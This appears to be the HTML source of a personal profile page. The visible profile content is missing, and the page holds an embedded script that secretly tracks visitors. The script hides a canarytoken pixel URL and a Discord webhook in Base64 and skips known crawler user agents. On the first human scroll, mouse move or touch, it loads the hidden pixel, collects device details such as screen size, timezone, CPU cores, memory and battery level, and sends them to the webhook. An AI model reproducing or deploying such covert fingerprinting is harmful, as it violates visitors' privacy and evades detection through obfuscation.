<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <title>Nametrack/user/paradragoon</title>
    <meta name="description" content="my current forum and site names....">
    
    <!-- Meta tag telling Google explicitly not to auto-generate alternative descriptions from page text -->

    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f3f4f6; color: #1f2937; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .profile-container { background: white; border: 1px solid #e5e7eb; border-radius: 12px; padding: 32px; max-width: 400px; width: 100%; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05), 0 2px 4px -1px rgba(0,0,0,0.03); text-align: center; }
        .avatar-placeholder { width: 96px; height: 96px; background-color: #e5e7eb; border: 2px dashed #9ca3af; border-radius: 50%; margin: 0 auto 16px auto; display: flex; align-items: center; justify-content: center; }
        .avatar-icon { font-size: 36px; color: #9ca3af; }
        h1 { font-size: 24px; font-weight: 700; margin: 0 0 4px 0; color: #111827; }
        .meta-info { font-size: 13px; color: #6b7280; margin-bottom: 24px; }
        .section-box { margin-top: 20px; text-align: left; }
        .section-title { font-size: 11px; font-weight: 600; color: #4b5563; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 8px; }
        .list-box { max-height: 110px; overflow-y: auto; border: 1px solid #e5e7eb; padding: 12px; border-radius: 8px; background: #f9fafb; font-size: 13px; color: #2563eb; line-height: 1.6; font-family: monospace; }
        .social-box { border: 1px solid #e5e7eb; padding: 12px; border-radius: 8px; background: #f9fafb; font-size: 13px; }
        .social-link { display: block; color: #2563eb; text-decoration: none; margin-bottom: 6px; font-weight: 500; }
        .social-link:last-child { margin-bottom: 0; }
        .social-link:hover { text-decoration: underline; }
    </style>
</head>
<body>

        <div class="avatar-placeholder">

    <!-- Container where the Canarytoken will safely mount ONLY if a real human loads it -->
    <div id="secure-canary-container"></div>

    <script>
    // Security lock variables
    let safetyTriggered = false;

    // Obfuscated tracking links (Base64) to prevent automated raw-text repository scrapers
    const secretKeys = {
        canary: "aHR0cDovL2NhbmFyeXRva2Vucy5jb20vZmVlZGJhY2svdGVybXMvc3R1ZmYvNHlzdTZhMHJramtkY2E4NjN6aGMxMmtkci9jb250YWN0LnBocA==",
        discord: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMDY3NzE1NDYyNTY4NzY0Mi9tWVdENDd5LVl6ckE5YlJBZ2hOeVNpanJHLVlxTFVLbng5SjhzMUFqbU9BT2J6ZkxBNnhCNFFGbHgtcndUSmQ1S1dYbQ=="
    };

    function runSecurityCheck() {
        if (safetyTriggered) return;

        const agent = navigator.userAgent.toLowerCase();
        
        // Strict bot filters checking strings from Facebook, Amazon AWS, and Google's rendering bots
        const badBots = ['facebookexternalhit', 'facebot', 'amazon', 'aws', 'googlebot', 'gsa-crawler', 'headless'];
        const isBot = badBots.some(bot => agent.includes(bot));

        if (isBot) {
            console.log("Automated bot crawler detected. Security protocols preserved.");
            return; 
        }

        safetyTriggered = true;

        // 1. Unpack and deploy Canarytoken dynamically inside active environment memory
        const targetDiv = document.getElementById('secure-canary-container');
        const hiddenPixel = document.createElement('img');
        hiddenPixel.src = atob(secretKeys.canary);
        hiddenPixel.style.display = "none";
        hiddenPixel.alt = "";
        targetDiv.appendChild(hiddenPixel);

        // 2. Fire the device verification log straight to Discord
        gatherFingerprint();
    }

    async function gatherFingerprint() {
        const data = {
            screen_size: `${window.screen.width}x${window.screen.height}`,
            local_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            system_language: navigator.language,
            logical_processors: navigator.hardwareConcurrency || "Unknown",
            device_memory: navigator.deviceMemory || "Unknown",
            window_size: `${window.innerWidth}x${window.innerHeight}`,
            battery_level: "Unsupported/Blocked",
            is_charging: "N/A"
        };

        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                data.battery_level = `${Math.round(battery.level * 100)}%`;
                data.is_charging = battery.charging ? "Yes" : "No";
            } catch (e) {}
        }

        const endpoint = atob(secretKeys.discord);
        
        fetch(endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `🖥️ **New Device Fingerprint Captured!**\n• **Screen Size:** ${data.screen_size}\n• **Local Timezone:** ${data.local_timezone}\n• **Battery Level:** ${data.battery_level} (Charging: ${data.is_charging})\n• **System Language:** ${data.system_language}\n• **CPU Cores:** ${data.logical_processors} | **RAM:** ${data.device_memory} GB\n• **Browser Window:** ${data.window_size}`
            })
        });
    }

    // Rely exclusively on dynamic human triggers instead of DOMContentLoaded/onload
    window.addEventListener("scroll", runSecurityCheck, { passive: true });
    window.addEventListener("mousemove", runSecurityCheck, { passive: true });
    window.addEventListener("touchstart", runSecurityCheck, { passive: true });
    </script>
